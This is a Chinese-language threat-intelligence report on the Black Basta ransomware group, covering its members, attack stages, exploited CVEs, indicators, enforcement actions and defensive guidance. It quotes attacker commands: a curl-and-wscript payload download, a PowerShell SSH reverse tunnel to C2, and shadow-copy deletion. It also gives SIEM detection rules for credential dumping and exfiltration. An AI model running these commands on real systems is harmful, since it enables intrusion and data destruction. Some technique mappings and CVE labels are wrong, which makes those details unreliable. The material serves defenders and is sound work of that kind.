# Black Basta 勒索组织详细威胁情报报告

## 一、组织概述

**Black Basta**（又称 BlackBasta、Basta、Vengeful Mantis、UNC4393）是一个俄罗斯语系的勒索软件即服务（RaaS）组织，于2022年4月首次被发现。该组织被认为是2022年5月消失的著名Conti勒索软件组织的重组或分支。

### 基本信息
- **首次出现时间**: 2022年4月
- **运营模式**: 勒索软件即服务（RaaS）集群
- **语言**: 俄语
- **组织性质**: 封闭式高端RaaS集群，由核心开发人员和管理员协调的专家网络
- **活跃状态**: 2025年3月被认为已停止活动（品牌崩溃），但其战术和工具在其他品牌中继续使用
- **替代品牌**: 部分成员转移到 Cactus、SafePay 等其他勒索软件组织

### 财务规模
- **勒索金额**: 截至2023年底，通过勒索支付至少获得1.07亿美元（基于区块链追踪）
- **受害者数量**: 2022年4月至2024年5月期间影响超过500个组织
- **2022年攻击**: 至少165个组织
- **德国损失**: 超过2000万欧元

---

## 二、组织架构与关键人物

### 2.1 核心领导层

#### 首领：Oleg Evgenievich Nefedov（奥列格·叶夫根耶维奇·涅菲多夫）
- **别名**: "GG"、"Tramp"、"Trump"、"AA"、"usernamegg"
- **国籍**: 俄罗斯
- **年龄**: 35岁（截至2025年）
- **籍贯**: 约什卡尔-奥拉（Yoshkar-Ola）
- **角色**: Black Basta创始人和最高领导者，Conti旧部（Team 3/Conti Team 3）
- **当前状态**: 
  - 2024年6月21日在亚美尼亚被捕
  - 等待法院裁决期间逃跑返回俄罗斯（约72小时内）
  - 称有"高层官员"帮助逃脱
  - 目前位于俄罗斯，免于引渡
  - 2026年1月被列入欧盟"最通缉犯"名单
  - 国际刑警组织已发布红色通缉令
- **基础设施**: 据报道在莫斯科租用至少两个办公室

#### 关键成员

| 用户名 | 真实姓名/别名 | 角色 | 备注 |
|--------|--------------|------|------|
| **tinker** | - | 谈判专家/客服主管 | 曾任职Conti，现也关联BlackSuit/Royal |
| **chuck** | - | Qakbot操作员/开发者 | 与GG在迪拜购置房产 |
| **Bio** | - | 关键运营人员 | 2024年中因执法部门遭遇被边缘化 |
| **Dispossesor** | - | 攻击者 | 试图加入组织 |
| **w** | - | 运营安全专家 | 负责OPSEC措施 |

### 2.2 组织结构

Black Basta采用高度结构化和层级化的组织模式：

**内部员工**（在Tramp直接严格监督下工作）:
- 恶意软件运营商
- 网络入侵者
- 开发人员
- 基础设施管理员
- 谈判人员

**独立附属成员**（Pentesters/Affiliates）:
- 通常是Tramp在其他非法行动中的前同事（如Conti RaaS或银行木马）
- 在自己的团队中运作，使用不同的工具和方法
- 与核心管理层存在紧张关系

**专业分工**:
- 基础设施管理
- 初始访问
- 恶意软件和C2混淆
- 开发
- 谈判/客服

---

## 三、攻击生命周期与TTPs

### 3.1 完整攻击链

```
初始访问 → 凭证获取 → 权限提升 → 横向移动 → 防御规避 → 数据渗出 → 加密勒索
```

### 3.2 各阶段详细技术分析

#### 阶段一：初始访问（Initial Access）

**主要向量**:

1. **钓鱼邮件（Spear Phishing）**
   - 发送带恶意链接的压缩包邮件
   - 邮件包含文件解压密码以增加可信度
   - 示例邮件主题："Re: Victim - Multiple POs attached"
   - MITRE ATT&CK: T1566.002（钓鱼链接）、T1204.002（用户执行恶意文件）

2. **Qakbot恶意软件**
   - 主要通过被攻破的ZIP文件中的.lnk快捷方式部署
   - 使用curl.exe和wscript.exe下载和执行JavaScript载荷
   - 命令示例:
   ```
   /q /c MD "%APPDATA%\xx\xxxx" && curl.exe --output %APPDATA%\xx\xxxx\qakbot.js hxxps://xxxxx[.]com/xxx.js && cd "%APPDATA%\xx\xxxx" && wscript qakbot.js
   ```

3. **漏洞利用**
   - 利用已知CVE进行初始访问
   - 重点利用有公开PoC的漏洞
   - MITRE ATT&CK: T1190（利用公开应用漏洞）

4. **社交工程/语音钓鱼（Vishing）**
   - 通过邮件轰炸（Email Bombing）淹没用户收件箱
   - 冒充IT支持通过Microsoft Teams联系受害者
   - 诱骗用户安装远程工具（Quick Assist、AnyDesk等）
   - 利用QR码绕过MFA认证

5. **合法凭证获取**
   - 从初始访问经纪人（IABs）购买凭证
   - 利用被盗的RDP和VPN凭证
   - 暴力破解默认VPN凭证
   - MITRE ATT&CK: T1078（有效账户）

6. **远程桌面协议（RDP）**
   - 利用暴露的RDP服务
   - 结合窃取的凭证访问

#### 阶段二：内部侦察与部署（Internal Reconnaissance）

**部署工具**:
- **Cobalt Strike**: 主要后渗透框架，用于网络扫描、端口发现
- **SystemBC**: 建立加密C2连接
- **SoftPerfect Network Scanner** (netscan.exe): 主机名、网络服务、远程访问协议信息收集

**侦察命令**:
```powershell
# 使用ifconfig.exe、netstat.exe、ping.exe进行网络发现
# WMIC滥用收集系统信息
```

#### 阶段三：权限提升（Privilege Escalation）

**利用的漏洞**:

| 漏洞名称 | CVE ID | CVSS评分 | 用途 |
|---------|--------|---------|------|
| ZeroLogon | CVE-2020-1472 | 10.0 | 域控权限提升 |
| NoPac | CVE-2021-42278 | 10.0 | 域控权限提升 |
| NoPac | CVE-2021-42287 | 10.0 | 域控权限提升 |
| PrintNightmare | CVE-2021-34527 | 10.0 | 特权执行 |
| ConnectWise ScreenConnect | CVE-2024-1709 | 10.0 | 初始访问 |
| Windows Error Reporting | CVE-2024-26169 | - | 权限提升 |

**其他技术**:
- MITRE ATT&CK: T1068（利用漏洞进行权限提升）

#### 阶段四：凭证获取（Credential Access）

**主要工具**:
- **Mimikatz**: 从LSASS内存转储凭据
- 密码破解服务（Hash Crackers）
- 信息窃取器（Info Stealers）: 从浏览器密码库和应用中抓取登录信息
- 利用泄露的凭证数据库（约3000个独特凭证在泄露日志中被发现）

**凭证利用方式**:
- Pass-the-Hash攻击
- 在电子邮件对话中寻找远程访问凭证
- 横向移动阶段复用凭证

#### 阶段五：横向移动（Lateral Movement）

**移动技术**:
- **Cobalt Strike Beacons**: 网络内横向移动
- **PsExec**: 远程进程执行
- **BITSAdmin**: 后台智能传输服务滥用
- **RDP**: 使用窃取凭证的远程桌面
- **SOCKS代理**: 隐藏连接、.pivot操作
- **合法RMM工具**: AnyDesk、Splashtop、ScreenConnect、NetSupport Manager、Quick Assist

**PowerShell反向Shell**:
```powershell
# 建立SSH反向连接到C2
for(;;) {start ssh -Args "a@%BCSERV% -о ServerAliveInterval=5 -f -N -R 0.0.0.0:%LISTEN_PORT% :127.0.0.1:22000 -p 443 -o StrictHostKeyChecking=no -i %MAINDIR%\id_client.ini" -WindowStyle Hidden -Wait}
```

#### 阶段六：防御规避（Defense Evasion）

**技术手段**:
- **PowerShell脚本**: 禁用Windows Defender和杀毒软件
- **Backstab工具**: 专门用于终止EDR（端点检测与响应）进程
- **注册表操作**: 修改注册表禁用安全工具
- **临时目录滥用**: 在temp目录部署恶意载荷
- **BITS组件滥用**: 利用Background Intelligent Transfer Service
- **安全模式启动**: 在安全模式下执行加密
- **与FIN7关联**: 使用类似FIN7的自定义EDR逃避模块

#### 阶段七：数据渗出（Data Exfiltration）

**渗出工具**:
- **Rclone**: 主要数据渗出工具，可过滤特定文件后上传到云服务
- **WinSCP**: 文件传输客户端
- **Mega**: 主要使用的云存储提供商

**渗出策略**:
- 在加密前先窃取数据（双重勒索）
- 压缩为.zip或.7z格式
- 针对文件服务器和关键数据

#### 阶段八：加密勒索（Impact）

**加密技术**:
- **算法**: ChaCha20 + RSA-4096混合加密
- **文件扩展名**: `.basta`
- **加密方式**: 64字节分块加密，每段间保留128字节未加密
- **速度优势**: 快速加密是关键卖点（附属成员关注点）

**勒索信**:
- 文件名: `readme.txt` 或 `instructions_read_me.txt`
- 不包含初始勒索金额或支付说明
- 提供唯一代码和.onion URL（通过Tor浏览器访问）
- 给予10-12天付款期限
- 更改桌面壁纸为勒索信息图片

**破坏性操作**:
```cmd
# 删除卷影副本
C:\Windows\System32\vssadmin.exe delete shadows /all /quiet

# 创建计划任务实现持久化
# 生成互斥量防止重复运行
# Mutex字符串: dsajdhas.0
```

**加密参数**:
- 支持`-forcepath`命令行参数指定加密目录
- 包含反分析和沙箱检测技术

---

## 四、 exploited 漏洞汇总

根据泄露日志分析，Black Basta涉及**62个独特CVE**，其中：
- **53个**已知被公开利用
- **44个**出现在CISA已知被利用漏洞（KEV）目录中

### Top 10 高频利用漏洞（Qualys分析）

| 排名 | 漏洞 | CVE ID | 描述 |
|-----|------|--------|------|
| 1 | Follina (MSWord) | CVE-2022-30190 | Office远程代码执行 |
| 2 | Log4Shell | CVE-2021-44228 | Java Log4j RCE |
| 3 | Spring4Shell | CVE-2022-22965 | Spring Framework RCE |
| 4 | ProxyNotShell | CVE-2022-41028 | Exchange Server漏洞 |
| 5 | ProxyNotShell | CVE-2022-41040 | Exchange Server漏洞 |
| 6 | ZeroLogon | CVE-2020-1472 | Netlogon特权提升 |
| 7 | NoPac | CVE-2021-42278 | SAMR特权提升 |
| 8 | NoPac | CVE-2021-42287 | Rpcrt4特权提升 |
| 9 | PrintNightmare | CVE-2021-34527 | 打印.spoolsv RCE |
| 10 | ConnectWise | CVE-2024-1709 | ScreenConnect RCE |

### 其他被提及的漏洞类型
- Fortinet FortiOS (CVE-2024-23113)
- Bricks Builder WordPress (CVE-2024-25600)
- Exim Email (CVE-2023-42115)
- 零日漏洞开发和购买资源

---

## 五、工具与恶意软件清单

### 5.1 恶意软件家族

| 工具名称 | 类型 | 用途 |
|---------|------|------|
| **Qakbot (QBot)** | 银行木马/加载器 | 初始访问、后门 |
| **Pikabot** | 加载器 | Qakbot替代方案 |
| **Bokbot** | 加载器 | 备选加载器 |
| **DarkGate** | 加载器 | 恶意软件分发 |
| **SystemBC** | C2框架 | 加密命令控制 |
| **BackConnect (QBACKCONNECT)** | 远控木马 | 持久控制（2024年10月起新增） |
| **Backstab** | EDR逃避工具 | 终止安全软件进程 |
| **Mimikatz** | 凭证窃取工具 | LSASS内存转储 |
| **Cobalt Strike** | 后渗透框架 | 侦察、横向移动 |

### 5.2 合法工具滥用

| 工具 | 用途 |
|------|------|
| **Rclone** | 数据渗出 |
| **WinSCP** | 文件传输 |
| **AnyDesk** | 远程控制 |
| **Splashtop** | 远程管理 |
| **ScreenConnect/ConnectWise** | 远程支持（也被利用漏洞） |
| **Quick Assist** | Windows远程协助 |
| **NetSupport Manager** | 远程管理 |
| **PowerShell** | 脚本执行、EDR禁用 |
| **BITSAdmin** | 文件传输 |
| **PsExec** | 远程执行 |
| **WMI** | 远程管理 |
| **curl.exe** | 文件下载 |
| **RDP** | 远程桌面 |

### 5.3 通信工具
- **Matrix/Element**: 内部通信平台（2024年9月迁移到新服务器）
- **Telegram**: 地下论坛交流、招聘
- **Tor浏览器**: 访问泄露网站和支付

---

## 六、目标行业与地域分布

### 6.1 目标行业

**重点目标**（按攻击频率排序）:
1. **医疗保健/公共卫生 (HPH)** - 规模最大、技术依赖度高、患者数据价值高
2. **制造业** - 11个victim（2024年10月以来）
3. **房地产与建筑** - 9个victim
4. **金融服务** - 6个victim
5. **国防**
6. **能源/公用事业**
7. **教育**
8. **零售**
9. **娱乐**

**关键基础设施覆盖**: 16个关键基础设施部门中的12个

### 6.2 地域分布

| 地区 | 攻击数量 | 主要国家 |
|-----|---------|---------|
| **北美** | 21+ | 美国(17)、加拿大(5) |
| **欧洲** | 18+ | 英国(5)、德国、法国等 |
| **亚太** | - | 澳大利亚、新西兰、日本 |

**美国**是最严重受影响的国家。

---

## 七、标志性攻击事件

### 7.1 Ascension医疗系统攻击（2024年5月）
- **影响**: 19个州的约140家医院
- **后果**: 被迫回归纸质工作流程、救护车分流
- **意义**: 该事件的升级风险环境导致执法打击力度加大

### 7.2 其他知名受害者
- Dish Network
- Maple Leaf Foods
- BT Group
- Rheinmetall（国防承包商）

---

## 八、组织崩溃与泄露事件

### 8.1 崩溃时间线

| 时间 | 事件 |
|------|------|
| **2023年8月** | Qakbot遭到国际打击行动（Operation Duckhunt），Black Basta主要初始访问渠道中断 |
| **2024年6月21日** | 首领GG（Nefedov）在亚美尼亚被捕后逃跑 |
| **2024年下半年** | 内部 tension 加剧：技术故障、财务分歧、成员不满 |
| **2024年10月** | 开始使用新的社交工程战术（Teams+邮件轰炸） |
| **2025年1月** | Black Basta泄露网站发布最后一名受害者 |
| **2025年2月11日** | 约20万条内部聊天记录被泄露 |
| **2025年3月** | Black Basta被认为已停止活动 |
| **2025年至今** | 成员转移到Cactus、SafePay等其他组织 |

### 8.2 聊天记录泄露详情

- **泄露者**: Telegram用户"ExploitWhispers"
- **数据量**: 196,045条消息（约20万条）
- **时间跨度**: 2023年9月18日 - 2024年9月28日
- **平台**: Matrix/Element聊天室（80个不同聊天室）
- **语言**: 主要为俄语
- **重要性**: 与2022年Conti泄露事件相当

### 8.3 泄露内容揭示

**内部冲突**:
- 加密技术故障导致即使支付赎金也无法解密
- 财务优先级和分配不公的争论
- 对Qakbot中断后找不到替代方案的沮丧
- 成员间的不信任

**运营细节**:
- 愿意为Ivanti零日漏洞支付高达20万美元
- 维护目标组织人员电子表格
- 精心选择目标（金融、工业制造商、能源）
- 雇佣社交工程专家提高攻击成功率

**成员流动**:
- 部分成员加入Cactus勒索软件组织
- SafePay组织吸收了Black Basta的最强威胁行为者

---

## 九、IOC（入侵指标）

### 9.1 文件指标

| 类型 | 指标 | 说明 |
|-----|------|------|
| **加密扩展名** | `.basta` | 被加密文件的扩展名 |
| **勒索信** | `readme.txt`、`instructions_read_me.txt` | 勒索说明文件 |
| **Mutex** | `dsajdhas.0` | 勒索软件互斥量 |
| **Qakbot载荷** | `%APPDATA%\xx\xxxx\qakbot.js` | JavaScript载荷路径 |

### 9.2 命令指标

```cmd
# 删除卷影副本
vssadmin.exe delete shadows /all /quiet

# 勒索软件命令行参数
-blackbasta.exe -forcepath <directory>
```

### 9.3 网络指标

- **C2通信**: SystemBC加密通道
- **Matrix服务器**: 6个域名上的80个聊天室
- **泄露网站**: Basta News（.onion URL）
- **数据渗出**: Rclone上传到Mega等云服务

### 9.4 行为指标

- 批量文件扩展名更改为`.basta`
- vssadmin.exe异常调用
- PowerShell禁用Windows Defender
- Backstab工具进程终止行为
- AnyDesk/ScreenConnect等RMM工具的异常安装

---

## 十、MITRE ATT&CK 映射

| 战术 | 技术ID | 技术名称 |
|-----|--------|---------|
| **Initial Access** | T1566.002 | 钓鱼链接 |
| | T1190 | 利用公开应用漏洞 |
| | T1078 | 有效账户 |
| | T1595 | 主动侦察 |
| **Execution** | T1059.001 | 命令和脚本解释器: PowerShell |
| | T1204.002 | 用户执行: 恶意文件 |
| **Persistence** | T1053.005 | 计划任务/定时任务 |
| **Privilege Escalation** | T1068 | 利用漏洞进行权限提升 |
| **Defense Evasion** | T1562.001 | 抑制防病毒/EDR |
| | T1046 | 网络服务发现 |
| **Credential Access** | T1003 | 操作系统凭据转储 |
| **Discovery** | T1049 | 系统网络发现 |
| **Lateral Movement** | T1021.001 | 远程桌面协议 |
| | T1570 | 非标准端口Lateral Movement |
| **Collection** | T1005 | 从本地系统数据收集 |
| **Exfiltration** | T1040 | 网络嗅探 |
| | T1567 | 滥用云托管 |
| **Impact** | T1486 | 数据加密用于勒索 |
| | T1490 | 阻断卷影副本 |
| | T1565 | 数据篡改/渗漏 |

---

## 十一、关联组织与生态

### 11.1 前身/关联组织
- **Conti** (2022年5月消失) - Black Basta被认为是Conti的重命名或分支
- **Conti Team 3** (Tramp的团队) - Black Basta的创始团队
- **FIN7** - 相似的EDR逃避模块

### 11.2 后继/继承组织
- **Cactus** - 部分Black Basta成员转移至此
- **SafePay** - 吸收Black Basta最强成员，工具与战术类似Conti和Black Basta
- **BlackSuit/Royal** - 另一Conti分支，部分成员交叉

### 11.3 服务提供商
- **Initial Access Brokers (IABs)** - 在地下论坛出售网络访问权限
- **凭证窃取服务** - Info Stealers as a Service
- **密码破解服务** (Hash Crackers) - 乌克兰嫌疑人专门从事此项
- **零日漏洞市场** - 购买或开发新漏洞利用

---

## 十二、执法行动与国际合作

### 12.1 主要行动

| 时间 | 行动 | 参与方 |
|------|------|--------|
| **2023年8月** | Operation Duckhunt (Qakbot打击) | 多国执法 |
| **2024年6月** | Nefedov逮捕（亚美尼亚） | 美国/INTERPOL通缉 |
| **2025-2026年** | 乌克兰-德国联合行动 | 乌克兰、德国、瑞士、荷兰、英国 |
| **持续** | 国际刑警红色通缉 | 国际刑警组织 |

### 12.2 最新执法进展（2026年1月）
- 乌克兰警方在伊万诺-弗兰科夫斯克和利沃夫地区进行搜索
- 两名乌克兰籍"密码破解者"被捕
- 查获数字存储设备、计算机、手机、手写笔记和加密货币
- Oleg Nefedov被列入欧盟最通缉犯名单和INTERPOL红色通缉

---

## 十三、防御建议与应急指南

### 13.1 预防建议

**基础安全措施**:
1. 及时安装操作系统、软件和固件更新
2. 要求所有服务使用钓鱼-resistant MFA
3. 培训用户识别和报告钓鱼尝试
4. 禁用不必要的RDP和VPN暴露
5. 实施网络分段

**针对Black Basta的专项防御**:
1. **监控Qakbot/Pikabot相关IOC**
2. **检测Cobalt Strike Beacon通信**
3. **监控RMM工具（AnyDesk、Splashtop等）的异常安装**
4. **检测Rclone异常上传行为**
5. **监控vssadmin.exe的异常调用**
6. **防范CVE-2024-1709（ConnectWise）等关键漏洞**
7. **保护域控制器免受ZeroLogon/NoPac攻击**
8. **部署EDR并监控Backstab类工具行为**

**社交工程防御**:
1. 验证通过Teams/电话联系的"IT支持"请求
2. 警惕邮件轰炸期间的异常来电
3. 不随意安装远程访问工具
4. QR码认证需谨慎验证

### 13.2 应急响应

**检测到Black Basta攻击时的步骤**:

1. **立即隔离**: 断网受感染系统
2. **不要支付赎金**: 支付不保证解密，且可能招致更多攻击
3. **报告执法**: 联系当地FBI办事处或CISA
4. **取证调查**:
   - 检查Qakbot/Cobalt Strike IOC
   - 审查PowerShell日志
   - 检查Mimikatz使用痕迹
   - 分析Rclone/WinSCP日志
5. **恢复**:
   - 从干净备份恢复
   - 重置所有可能泄露的凭据
   - 全面密码轮换

### 13.3 SIEM检测规则建议

```
# 检测vssadmin删除卷影副本
ProcessCreation where process.name="vssadmin.exe" and process.command_line contains "delete shadows"

# 检测Mimikatz使用
ProcessCreation where process.name="mimikatz.exe" or process.command_line contains "sekurlsa"

# 检测PowerShell禁用Defender
ProcessCreation where process.name="powershell.exe" and process.command_line contains "Disable-MpPreference" or process.command_line contains "Remove-MpPreference"

# 检测Backstab进程终止
ProcessCreation where process.name="backstab.exe" or process.image contains "backstab"

# 检测异常RMM安装
ProcessCreation where process.name in ("anydesk.exe", "splashtop.exe", "screenconnect.exe", "quickassist.exe") and signature_status != "valid"

# 检测Rclone异常上传
ProcessCreation where process.name="rclone.exe" and process.command_line contains "upload" or process.command_line contains "sync"
```

---

## 十四、威胁评估总结

### 14.1 威胁等级: **极高 (CRITICAL)**

### 14.2 关键特征

**优势（对攻击者）**:
- 高度组织化和专业化的运营结构
- 快速加密能力（ChaCha20+RSA4096）
- 多样化的初始访问手段
- 熟练的社交工程技术
- 持续进化的TTPs
- 强大的漏洞利用资源

**弱点/风险**:
- 2025年品牌已崩溃，活动大幅减少
- 核心领导层被通缉/逃逸
- 内部信任破裂，成员流失
- 聊天记录泄露暴露大量IOC
- 面临多国联合执法打击

### 14.3 未来趋势

1. **组织转型**: Black Basta成员以Cactus、SafePay等新品牌继续活动
2. **工具复用**: 原有战术和工具在新品牌下继续使用
3. **执法压力**: 国际联合打击持续加强
4. **技术演进**: 可能转向更先进的加密和逃避技术
5. **目标变化**: 从大型企业转向更容易攻击的目标

---

## 十五、参考资源

### 官方 advisories
- [CISA CSA AA24-131A](https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-131a) - #StopRansomware: Black Basta
- [CISA STIX IOC Download](https://www.cisa.gov/sites/default/files/2024-11/AA24-131A.stix_.xml)

### 情报研究报告
- [Kroll - Black Basta Technical Analysis](https://www.kroll.com/en/publications/cyber/black-basta-technical-analysis)
- [Qualys - Black Basta Ransomware: What You Need to Know](https://blog.qualys.com/vulnerabilities-threat-research/2024/09/19/black-basta-ransomware-what-you-need-to-know)
- [Palo Alto Unit 42 - Threat Assessment: Black Basta](https://unit42.paloaltonetworks.com/threat-assessment-black-basta-ransomware/)
- [Intel471 - Black Basta Exposed](https://www.intel471.com/blog/black-basta-exposed-a-look-at-a-cybercrime-data-leak)
- [Trend Micro - Black Basta and Cactus BackConnect](https://www.trendmicro.com/en_us/research/25/b/black-basta-cactus-ransomware-backconnect.html)
- [Barracuda - Lessons from Black Basta's Collapse](https://blog.barracuda.com/2026/02/02/lessons-from-black-basta-s-collapse)
- [CyberDefenders - Complete SOC Response Guide](https://cyberdefenders.org/blog/black-basta-ransomware/)
- [Picus Security - Black Basta Analysis and Mitigation](https://www.picussecurity.com/resource/blog/black-basta-ransomware-analysis-cisa-alert-aa24-131a)
- [Outpost24 - Threat Context February 2025](https://outpost24.com/blog/threat-context-monthly-february-2025-black-basta-maga/)
- [Flare.io - Deciphering Black Basta's Infrastructure](https://flare.io/learn/resources/blog/deciphering-black-bastas-infrastructure-from-the-chat-leak)

### 中文资料
- [FreeBuf - 剖析Black Basta勒索软件入侵策略](https://www.freebuf.com/news/423339.html)
- [安全内参 - 通信数据泄露！Black Basta内部攻击技术揭秘](https://www.secrss.com/articles/76049)
- [CSDN - 泄露事件揭露Black Basta战术](https://blog.csdn.net/FreeBuf_/article/details/146172919)

### 数据泄露源
- [GitHub - BlackBasta-Chats (ExploitWhispers泄露)](https://github.com/D4RK-R4BB1T/BlackBasta-Chats/)
- [PRODAFT Analysis](https://x.com/PRODAFT/status/1892636346885235092)
- [LevelBlue - Deep Dive into Leaked Black Basta Chat Logs](https://levelblue.com/hubfs/Web/Library/Documents_pdf/A_Deep_Dive_into_the_Leaked_Black_Basta_Chat_Logs.pdf)

### 受害者追踪
- [Ransomware.live - Black Basta Victims](https://www.ransomware.live/group/blackbasta)

### 执法信息
- [德国BKA - Black Basta通缉信息](https://www.bka.de/DE/IhreSicherheit/Fahndungen/Personen/BekanntePersonen/BlackBasta/Sachverhalt.html?nn=26874)
- [INTERPOL Red Notice](https://www.interpol.int/How-we-work/Notices/Red-Notices/View-Red-Notices#2025-100086)
- [乌克兰总检察院 - 联合行动公告](https://gp.gov.ua/en/posts/miznarodna-operaciya-ukrayini-ta-nimeccini-vikrito-ucasnikiv-ugrupovannya-black-basta)

---

## 附录：Black Basta vs 其他勒索软件对比

| 特征 | Black Basta | Conti | LockBit | Akira |
|-----|------------|-------|---------|-------|
| 首次出现 | 2022年4月 | 2020年 | 2019年(2023重组) | 2023年 |
| 前身 | Conti Team 3 | REvil分支 | - | - |
| 加密算法 | ChaCha20+RSA4096 | AES+RSA | ChaCha20 | ChaCha20(Rust) |
| 文件扩展名 | .basta | .locked | .lockbit | .akira |
| 组织状态 | 2025年崩溃 | 2022年解散 | 2023年被打击 | 活跃 |
| 勒索金额 | ~$107M+ | ~$15M+ | ~$100M+ | 快速增长 |
| 成员转移 | Cactus, SafePay | LockBit, 其他 | - | - |

---

**报告编制日期**: 2025年
**威胁状态**: Black Basta品牌已停止活动，但其成员和TTPs在其他组织中继续使用
**建议**: 持续监控Cactus、SafePay等继承组织的活动
